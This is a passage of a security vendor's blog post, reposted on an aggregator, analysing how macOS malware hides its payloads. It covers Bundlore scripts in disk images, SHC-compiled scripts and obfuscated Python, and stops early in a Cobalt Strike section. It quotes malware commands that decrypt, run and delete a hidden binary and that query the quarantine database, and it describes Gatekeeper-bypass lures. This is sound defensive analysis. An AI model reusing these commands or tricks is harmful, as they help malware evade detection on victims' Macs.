---
title: macOS Payloads | 7 Prevalent and Emerging Obfuscation Techniques
url: https://buaq.net/go-147235.html
source: unSafe.sh - 不安全
date: 2023-01-31
fetch_date: 2025-10-04T05:13:04.663733
---

# macOS Payloads | 7 Prevalent and Emerging Obfuscation Techniques

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/433221735b3c6028bf17272508dc90ca.jpg)

macOS Payloads | 7 Prevalent and Emerging Obfuscation Techniques

In our recent post, 7 Ways Threat Actors Deliver macOS Malware in the Enterprise, we discussed some
*2023-1-30 22:24:27
Author: [www.sentinelone.com(查看原文)](/jump-147235.htm)
阅读量:34
收藏*

---

In our recent post, [7 Ways Threat Actors Deliver macOS Malware in the Enterprise](https://www.sentinelone.com/blog/7-ways-threat-actors-deliver-macos-malware-in-the-enterprise/), we discussed some of the popular mechanisms currently in use by threat actors to achieve initial compromise on a macOS system. In this post, we continue our exploration of modern macOS malware by looking at different kinds of payloads that are either common or are emerging, with an emphasis on those that attempt obfuscation and evasion.

We take a look at scripts, the SHC shell script compiler, obfuscated Python, Go implants as well as some rare sightings of obfuscated Cobalt Strike beacons seen in some recent macOS-targeted campaigns.

![](https://www.sentinelone.com/wp-content/uploads/2023/01/macOS-Payloads-7-Prevalent-and-Emerging-Obfuscation-Techniques.jpg)

## 1. Hidden Scripts

A method first popularized by [Shlayer malware](https://www.sentinelone.com/blog/coming-out-of-your-shell-from-shlayer-to-zshlayer/), commodity adware and PUP platforms continue to leverage shell scripts delivered in disk images, often through [content lures](https://www.sentinelone.com/blog/7-ways-threat-actors-deliver-macos-malware-in-the-enterprise/).

Some malware families use the script as an executable in an app bundle, such as [this one](https://www.virustotal.com/gui/file/ffb2d3e70fcef59935aaa716b4637b252922277e38740d889d256ae12a6ae4ea/content).

```
/Volumes/Player/Player_253.app/Contents
/MacOS/MUwj3QKorpMfT39foaHiE5Cf6oBSVw
```

![Bundlore script](https://www.sentinelone.com/wp-content/uploads/2023/01/macos_payloads_8.jpg)

Others drop the script directly into a disk image file and encourage the user to execute it through an alias. The sample [2070b149b7d99cd4b396a8b78de5a28c1f2b505a](https://www.virustotal.com/gui/file/1dc8b1c97dfaae22f1c6514b6e05e4bf72dbf69bae747da21844739010219bed/details) provides a representative example.

![macos malware script hidden in disk image](https://www.sentinelone.com/wp-content/uploads/2023/01/macos_payloads_2.jpg)

On mounting the disk image, the user is presented with a two-step graphical instruction on how to open the malware and bypass the built-in macOS Gatekeeper restriction.

![Gatekeeper bypass](https://www.sentinelone.com/wp-content/uploads/2023/01/macos_payloads14_.jpg)

Examining the disk image in the Finder with hidden files displayed, it’s clear that the Install PKG icon the user is urged to right-click on is an alias to a shell script file located in a hidden directory called, appropriately enough, `.hidden`.

The script is lightly obfuscated. After creating a directory inside `/tmp` with a random 12-character name, it ultimately decrypts, runs and deletes an executable extracted from the data file located in the same directory.

```
/bin/bash -c eval '$(echo 'openssl enc -aes-256-cbc -d -A -base64 -k \'$archive\'
-in \'$appDir/$archive\' -out \'$tmpDir/$binFile\' xattr -c \'$tmpDir/\'* chmod 777
\'$tmpDir/$binFile\' \'$tmpDir/$binFile\' && rm -rf $tmpDir')'
```

The malware queries a number of system and environment variables to ascertain if it is running in a virtual machine. It also reads the local LSQuarantine file to check the source of the downloaded disk image, searching for URLs containing `%s3.amazonaws.com%`, suggesting that this version of Bundlore is using AWS to deliver the first stage disk images.

```
sh -c sqlite3 ~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV*
'select LSQuarantineDataURLString from LSQuarantineEvent where LSQuarantineDataURLString
like '%s3.amazonaws.com%' order by LSQuarantineTimeStamp desc limit 5'
```

This information is next posted to a C2 and a further payload is returned, mounted and launched.

SentinelOne detects such script-based malware, with this particular payload identified as `Bundlore.E`, a well-known commodity adware and PUP delivery platform.

## 2. Shell Script Compiler

Shell Script Compiler is a [Github repo](https://github.com/neurobin/shc) known as SHC for short, which takes a script and produces obfuscated C source code. The source code is then compiled and linked to produce a stripped binary executable. Although these binaries aren’t entirely independent – they still require the execution environment to have available the shell specified in the shebang – if the script uses a shell that is found by default on the target OS (e.g., `/bin/sh/` on macOS), execution should not be an issue.

![SHC shell script compiler XCSSET neurobin](https://www.sentinelone.com/wp-content/uploads/2023/01/macos_payloads_7.jpg)

SHC comes with some compilation options that are useful to malware authors. The -U option attempts to make the binary untraceable with [ptrace](https://cardaci.xyz/blog/2018/02/12/a-macos-anti-debug-technique-using-ptrace/). The `-e` option allows the author to set an expiry date after which the program won’t run. One useful side-effect of this is that the same script will produce binaries with different hashes if compiled with different values for -e.

![SHC source code](https://www.sentinelone.com/wp-content/uploads/2023/01/macos_payloads_6.jpg)

SHC was heavily used by [XCSSET malware](https://www.sentinelone.com/blog/xcsset-malware-update-macos-threat-actors-prepare-for-life-without-python/) and has been seen more recently obfuscating [Linux payloads](https://asec.ahnlab.com/en/45182/). It’s great advantage from an attacker’s point of view is it makes it extremely simple to write malicious scripts which cannot be read via static analysis and which, thanks to the `-e` option, can have endlessly different hash values. The only way to discover what an SHC-compiled binary does is to detonate it in a sandbox and observe its behavior.

![SHC payload executed by XCSSET macOS malware](https://www.sentinelone.com/wp-content/uploads/2023/01/macos_payloads_10.jpg)

SHC compiled binaries can be detected statically and marked as suspicious, as the compiler produces a distinctive string signature. However, only behavioral solutions will be able to distinguish between benign code and those with malicious intent.

## 3. Python Obfuscators

Apple removed support for Python 2.7 on macOS devices running Monterey 12.3 and later in 2022, and as a result the language has become a less attractive option for attackers than it once was.

However, there are still plenty of enterprise environments where some local version of Python will be installed as it remains hugely popular with developers of all stripes, and there is a ‘back catalog’ of Python-based attack frameworks such as Meterpreter and Empyre that are still favored by both attackers and red teams.

Packaging Python scripts into `.pyc` compiled Mach-Os is also still a viable attack option, but more commonly frameworks like Meterpreter will be [base64 encoded](https://www.sentinelone.com/blog/guide-encode-decoded-base64/) multiple times to obfuscate their true payload. Many of these remain undetected by static engines but are recognized by behavioral solutions like SentinelOne on execution.

![obfuscated python malware on virus total](https://www.sentinelone.com/wp-content/uploads/2023/01/macos_payloads_4.jpg)

## 4. Obfuscated Cobalt Strike

Widely-seen in malware targeting the Windows world, [Cobalt Strike](https://www.sentinelone.com/cybersecurity-101/w...